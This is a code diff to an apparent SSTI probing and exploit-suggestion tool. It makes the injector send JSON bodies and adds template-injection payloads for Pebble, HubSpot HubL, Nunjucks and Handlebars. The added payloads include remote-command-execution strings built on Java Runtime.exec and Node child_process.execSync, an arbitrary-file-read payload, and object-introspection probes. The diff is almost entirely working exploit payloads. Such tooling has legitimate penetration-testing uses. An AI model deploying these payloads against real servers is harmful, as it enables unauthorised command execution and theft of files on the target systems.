@@ -182,12 +182,20 @@ class SstiProbeTool:
         timeout: int,
     ) -> requests.Response:
         """Make request with payload injected into parameter."""
+        request_data = {param: payload, **extra_data}
         if method == "GET":
-            params = {param: payload, **extra_data}
-            return self.session.get(url, params=params, headers=headers, timeout=timeout)
+            return self.session.get(url, params=request_data, headers=headers, timeout=timeout)
         else:
-            form_data = {param: payload, **extra_data}
-            return self.session.post(url, data=form_data, headers=headers, timeout=timeout)
+            # Detect JSON content type
+            content_type = ""
+            for k, v in headers.items():
+                if k.lower() == "content-type":
+                    content_type = v.lower()
+                    break
+            if "application/json" in content_type:
+                return self.session.post(url, json=request_data, headers=headers, timeout=timeout)
+            else:
+                return self.session.post(url, data=request_data, headers=headers, timeout=timeout)
 
     def _probe_ssti(
         self,
@@ -469,10 +477,42 @@ class SstiExploitSuggester:
         "pebble": {
             "rce": [
                 "{{% set cmd = 'java.lang.Runtime' %}}{{% set runtime = beans.get(cmd).getRuntime() %}}{{% set process = runtime.exec('{cmd}') %}}{{process.getInputStream()}}",
+                "{{['java.lang.Runtime'].getRuntime().exec('{cmd}')}}",
             ],
             "info": [
                 "{{beans}}",
                 "{{request}}",
+            ],
+        },
+        "hubspot_hubl": {
+            "rce": [
+                "{{{{request.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}')}}}}",
+            ],
+            "file_read": [
+                "{{{{request.getClass().forName('java.util.Scanner').newInstance(request.getClass().forName('java.io.FileInputStream').newInstance('{file}')).useDelimiter('\\\\Z').next()}}}}",
+            ],
+            "info": [
+                "{{request.getClass()}}",
+                "{{request.getClass().getMethods()}}",
+            ],
+        },
+        "nunjucks": {
+            "rce": [
+                "{{% set proc = global.process %}}{{% set spawn = proc.mainModule.require('child_process').execSync %}}{{{{spawn('{cmd}')}}}}",
+                "{{{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"{cmd}\")')()}}}}",
+            ],
+            "info": [
+                "{{range.constructor('return this')()}}",
+                "{{range.constructor('return global')()}}",
+            ],
+        },
+        "handlebars": {
+            "rce": [
+                "{{{{#with \"s\" as |string|}}}}{{{{#with \"e\"}}}}{{{{#with split as |conslist|}}}}{{{{this.pop}}}}{{{{this.push (lookup string.sub \"constructor\")}}}}{{{{this.pop}}}}{{{{#with string.split as |codelist|}}}}{{{{this.pop}}}}{{{{this.push \"return require('child_process').execSync('{cmd}')\"}}}}{{{{this.pop}}}}{{{{#each conslist}}}}{{{{#with (string.sub.apply 0 codelist)}}}}{{{{this}}}}{{{{/with}}}}{{{{/each}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}",
+            ],
+            "info": [
+                "{{this}}",
+                "{{this.constructor}}",
             ],
         },
     }
